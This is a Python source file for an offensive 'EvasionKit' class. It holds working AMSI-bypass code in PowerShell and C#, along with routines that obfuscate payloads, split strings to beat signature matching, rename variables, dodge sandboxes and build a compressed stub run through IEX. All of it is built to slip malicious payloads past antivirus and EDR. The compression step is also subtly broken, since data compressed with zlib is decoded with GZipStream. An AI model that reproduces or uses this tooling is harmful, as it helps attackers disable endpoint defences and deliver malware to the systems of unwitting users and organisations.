import base64, zlib, os, sys, random, string, json, re
from typing import Dict, Union

sys.path.insert(0, os.path.dirname(__file__))

class EvasionKit:
    """
    EvasionKit provides methods for bypassing AV/EDR detections,
    obfuscating payloads, and evading sandboxes.
    """
    AMSI_BYPASS_PS = """$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)"""

    AMSI_BYPASS_CSHARP = """
using System;
using System.Runtime.InteropServices;
class A { 
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr p, int s, uint f, out uint l);
    static void Main() {
        IntPtr d = LoadLibrary("amsi.dll");
        IntPtr p = GetProcAddress(d, "AmsiScanBuffer");
        uint o; VirtualProtect(p, 0x1000, 0x40, out o);
        Marshal.Copy(new byte[0x1000], 0, p, 0x1000);
    }
}"""

    def base64_encode(self, data: str) -> str:
        """Encode a string into Base64 format."""
        return base64.b64encode(data.encode()).decode()

    def base64_decode(self, data: str) -> str:
        """Decode a Base64 encoded string."""
        return base64.b64decode(data).decode()

    def xor_obfuscate(self, data: str, key: int = 0x42) -> str:
        """Apply simple XOR obfuscation to a string payload."""
        return "".join(chr(ord(c) ^ key) for c in data)

    def split_string(self, data: str, parts: int = 4) -> str:
        """Split a string into smaller chunks to evade basic static string matching."""
        chunk = len(data) // parts
        pieces = [data[i:i+chunk] for i in range(0, len(data), chunk)]
        return "+".join(f'"{p}"' for p in pieces)

    def variable_obfuscate(self, code: str) -> str:
        """Randomize variable names in PowerShell scripts starting with '$'."""
        names = set(re.findall(r'\$(\w+)', code))
        mapping = {n: "$" + "".join(random.choices(string.ascii_letters, k=random.randint(6,12))) for n in names if len(n) > 1}
        for orig, new in mapping.items():
            code = code.replace(orig, new)
        return code

    def amsi_bypass(self, lang: str = "powershell") -> Dict[str, str]:
        """Generate AMSI bypass code for the specified language."""
        if lang == "powershell":
            return {"type": "amsi_bypass", "language": "powershell", "code": self.AMSI_BYPASS_PS,
                    "method": "AMSI Context patching", "detection_rate": "Low"}
        elif lang == "csharp":
            return {"type": "amsi_bypass", "language": "csharp", "code": self.AMSI_BYPASS_CSHARP,
                    "method": "AMSI ScanBuffer patching", "detection_rate": "Low-Medium"}
        return {"error": f"Unsupported: {lang}"}

    def evade_sandbox(self, payload: str, lang: str = "powershell") -> str:
        """Wrap payload with sleep and simple environmental checks to evade basic sandboxes."""
        sleep_cmd = "Start-Sleep -Seconds 5" if lang == "powershell" else "sleep(5)"
        check_vm = "$env:COMPUTERNAME -match 'SANDBOX|MALWARE|VIRUS'" if lang == "powershell" else ""
        guarded = f"if (-not ({check_vm})) {{ {sleep_cmd}; {payload} }}"
        return guarded

    def compress_payload(self, code: str) -> str:
        """Compress the payload using Zlib and encode in Base64 (returns PowerShell decompression stub)."""
        compressed = zlib.compress(code.encode())
        b64 = base64.b64encode(compressed).decode()
        return f'$d=[System.Convert]::FromBase64String("{b64}");$s=New-Object IO.MemoryStream;$s.Write($d,0,$d.Length);$r=New-Object IO.StreamReader(New-Object IO.Compression.GZipStream($s,[IO.Compression.CompressionMode]::Decompress));IEX($r.ReadToEnd())'

    def full_chain(self, payload: str, lang: str = "powershell") -> Dict[str, Union[int, Dict[str, str], str]]:
        """Apply all evasion techniques in a chain and return the details."""
        return {
            "original_size": len(payload),
            "step1_amsi": self.amsi_bypass(lang),
            "step2_evade": self.evade_sandbox(payload, lang),
            "step3_compress": self.compress_payload(payload),
            "final_size": len(self.compress_payload(payload)),
        }


